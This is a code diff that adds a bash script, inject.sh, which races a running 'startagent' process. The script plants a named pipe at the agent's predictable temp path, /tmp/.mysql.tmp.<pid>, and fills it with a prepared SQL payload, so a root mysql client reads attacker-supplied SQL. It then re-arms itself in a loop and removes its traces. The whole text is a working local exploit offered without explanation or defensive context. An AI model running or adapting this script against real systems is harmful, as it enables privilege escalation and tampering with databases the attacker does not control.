@@ -1,0 +1,29 @@
+cat > /tmp/inject.sh <<'EOF'
+#!/bin/bash
+PAY=/tmp/payload.sql
+log(){ echo "$(date +%H:%M:%S) $*"; }
+while true; do
+  PID=$(pgrep -f 'startagent process' | head -1)
+  [ -z "$PID" ] && { sleep 5; continue; }
+  F=/tmp/.mysql.tmp.$PID
+  [ -e "$F" ] && { sleep 0.3; continue; }
+  mkfifo "$F" 2>/dev/null || { sleep 1; continue; }
+  exec 3<>"$F" 2>/dev/null || { rm -f "$F"; sleep 1; continue; }
+  cat "$PAY" >&3
+  log "armed $F (agent pid $PID)"
+  while [ -e "$F" ]; do
+    if pgrep -f "mysql.tmp.$PID" >/dev/null 2>&1; then
+      log "root mysql seen — releasing EOF"
+      sleep 2
+      exec 3>&- 2>/dev/null
+      n=0
+      while [ -e "$F" ] && [ $n -lt 180 ]; do sleep 0.5; n=$((n+1)); done
+      [ -e "$F" ] && { log "cycle stuck, self-cleaning $F"; rm -f "$F"; }
+      log "cycle complete — re-arming"
+    else
+      sleep 0.2
+    fi
+  done
+done
+EOF
+chmod +x /tmp/inject.sh
